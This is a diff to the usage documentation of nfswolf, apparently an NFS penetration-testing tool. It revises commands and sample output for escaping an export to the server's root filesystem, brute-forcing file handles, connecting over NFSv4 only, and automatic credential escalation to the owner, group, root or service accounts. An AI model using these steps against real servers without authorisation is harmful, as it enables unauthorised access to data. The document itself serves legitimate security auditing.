@@ -23,7 +23,7 @@ Probes every host on the /24 for portmapper (111/tcp) and NFS (2049/tcp). Report
 nfswolf analyze 10.0.0.5 --json --quiet > audit.json
 ```
 
-Runs 30+ security checks against the target. The `--json` flag captures machine-readable results; `--quiet` suppresses status lines so only the JSON hits stdout.
+Checks the target for the 43 findings `analyze` detects. The `--json` flag captures machine-readable results; `--quiet` suppresses status lines so only the JSON hits stdout.
 
 ### Step 3: Escape the export boundary
 
@@ -113,7 +113,7 @@ When you know which export to target:
     nfswolf escape 10.0.0.5:/srv/nfs
     ```
 
-    Full seven-phase pipeline against the specified export: gathers seeds from MOUNT v3, MOUNT v1, and NFSv4, walks upward, constructs candidates for all 18 filesystem types, probes across versions, and reports every confirmed escape path.
+    Full seven-phase pipeline against the specified export: gathers seeds from MOUNT v3, MOUNT v1, and NFSv4, walks upward, constructs candidates for all 17 supported filesystem types, probes across versions, and reports every confirmed escape path.
 
 === "All exports"
 
@@ -126,9 +126,17 @@ When you know which export to target:
 The escape output includes a ready-to-paste `nfswolf shell --handle` command:
 
 ```
-[+] Escape successful: ext4 root (inode 2)
-    Handle: 01000700020000020000000002000000...
-    Run:    nfswolf shell 10.0.0.5 --handle 01000700020000020000000002000000...
+  Results:
+    [OS-ESCAPE]  inode 2 gen=0 (ext2/3/4, JFS)  via MOUNT v3 /srv/nfs   [v3 v4]  no_root_squash,rw
+         handle: 01000700020000020000000002000000...
+         ext4 inode 2 gen-based handle; ...
+         rootfs dirs: bin, boot, dev, etc, proc, sys, usr, var (score: 70)
+
+  1 handle(s) found from 3 seeds. 1 confirmed server rootfs.
+
+  Next steps: Copy the handle above and use it with:
+    nfswolf shell 10.0.0.5 --handle 01000700020000020000000002000000...
+    nfswolf mount 10.0.0.5 /mnt/escape --handle 01000700020000020000000002000000...
 ```
 
 ---
@@ -188,31 +196,35 @@ The SOCKS5 proxy is inline, with no external crate dependency. It handles DNS re
 When the server runs NFSv4 without portmapper or MOUNT (common in hardened environments):
 
 ```bash
-# Skip portmapper and MOUNT, connect directly via NFSv4
-nfswolf shell 10.0.0.5:/ --nfs-version 4 --skip-rpc --skip-mountd
+# Connect directly via NFSv4: no portmapper, no MOUNT
+nfswolf shell 10.0.0.5:/ --nfs-version 4
 ```
 
-NFSv4 uses a pseudo-filesystem rooted at `/` on port 2049 and does not require portmapper or the MOUNT protocol. The `--skip-rpc` and `--skip-mountd` flags prevent timeout delays from probing services that do not exist.
+NFSv4 uses a pseudo-filesystem rooted at `/` on port 2049 and does not need the portmapper or the MOUNT protocol. With `--nfs-version 4`, the shell skips version detection and connects straight to the NFS port, so neither is contacted.
 
 ```bash
-# Escape via pure NFSv4 (no MOUNT handles needed)
-nfswolf escape 10.0.0.5 --nfs-version 4 --skip-rpc --skip-mountd
+# Escape: NFSv4 seeds are gathered automatically; --skip-rpc keeps
+# the MOUNT port lookups off the portmapper
+nfswolf escape 10.0.0.5 --skip-rpc
 
-# Analyze with only NFSv4 checks
+# Analyze: discover exports through the NFSv4 pseudo-filesystem
+# and run the NFSv4 per-export checks
 nfswolf analyze 10.0.0.5 --skip-rpc --skip-mountd
 ```
+
+`escape` has no version switch. It always gathers seed handles from NFSv4 LOOKUP and the pseudo-filesystem alongside MOUNT v3 and v1, so on a v4-only server the v4 seeds carry the run. `--skip-rpc` means nfswolf never sends anything to port 111; the remaining MOUNT attempts go to the well-known mountd ports 2049 and 20048 and simply fail on a server without mountd.
 
 If the NFS port is also non-standard:
 
 ```bash
-nfswolf shell 10.0.0.5:/ --nfs-version 4 --skip-rpc --skip-mountd --nfs-port 12049
+nfswolf shell 10.0.0.5:/ --nfs-version 4 --nfs-port 12049
 ```
 
 ---
 
 ## Working with raw file handles
 
-File handles obtained from `escape`, `brute-handle`, or a packet capture can be used directly with `shell`, `mount`, and other subcommands, bypassing the MOUNT protocol entirely.
+File handles obtained from `escape`, `brute-handle`, or a packet capture can be used directly with `shell` and `mount` (`--handle`), bypassing the MOUNT protocol entirely, or as the seed for `brute-handle` (`--seed-handle`).
 
 ```bash
 # Decode a handle to understand its structure
@@ -228,7 +240,7 @@ nfswolf mount 10.0.0.5 /mnt/escaped --handle 01000700020000020000000002000000
 nfswolf mount 10.0.0.5 /mnt/target -e /srv --hide
 ```
 
-The `--handle` flag accepts any hex-encoded NFS file handle (v2: 32 bytes, v3: variable up to 64 bytes, v4: variable up to 128 bytes). The version is auto-detected from the handle length and server response unless `--nfs-version` is specified.
+The `--handle` flag accepts any hex-encoded NFS file handle (v2: 32 bytes, v3: variable up to 64 bytes, v4: variable up to 128 bytes). The handle length does not select the version: unless `--nfs-version` is specified, nfswolf probes the server (v3, then v2, then v4) and uses the first version that answers. Pass `--nfs-version` when the handle came from a specific version.
 
 ---
 
@@ -266,4 +278,4 @@ nfswolf brute-handle 10.0.0.5:/srv --inode-start 2 --inode-end 1000
 ```
 
 !!! info "Auto-escalation"
-    The `shell` and `mount` subcommands automatically try alternative credentials when an operation fails with `NFS3ERR_ACCES`. The credential ladder tries the file owner first, then root, then identities observed in directory listings. You do not need to manually switch UIDs in most cases.
+    The `shell` and `mount` subcommands automatically try alternative credentials when an operation fails with `NFS3ERR_ACCES`. The credential ladder tries the file owner first, then the caller with the file's group, then root, then common service accounts. You do not need to manually switch UIDs in most cases.
